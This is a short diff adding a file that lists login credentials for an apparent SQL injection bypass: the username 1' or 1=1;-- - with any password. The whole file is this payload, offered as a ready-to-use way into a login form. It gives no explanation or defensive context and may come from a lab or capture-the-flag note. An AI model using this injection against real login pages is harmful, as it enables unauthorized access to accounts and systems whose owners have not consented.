@@ -1,0 +1,4 @@
+Username
+1' or 1=1;-- - 
+Passwd
+(Anything you wish)
